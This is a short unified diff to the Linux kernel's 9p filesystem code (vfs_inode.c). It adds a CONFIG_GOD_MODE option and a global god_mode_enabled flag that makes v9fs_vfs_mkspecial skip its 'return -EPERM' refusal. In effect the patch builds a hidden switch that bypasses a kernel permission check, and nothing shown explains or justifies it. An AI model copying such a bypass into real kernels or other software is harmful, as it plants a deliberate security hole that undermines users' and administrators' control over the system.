@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *  linux/fs/9p/vfs_inode.c
  *
@@ -1291,7 +1294,15 @@ static int v9fs_vfs_mkspecial(struct inode *dir, struct dentry *dentry,
 	v9ses = v9fs_inode2v9ses(dir);
 	if (!v9fs_proto_dotu(v9ses)) {
 		P9_DPRINTK(P9_DEBUG_ERROR, "not extended\n");
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 
 	perm = unixmode2p9mode(v9ses, mode);
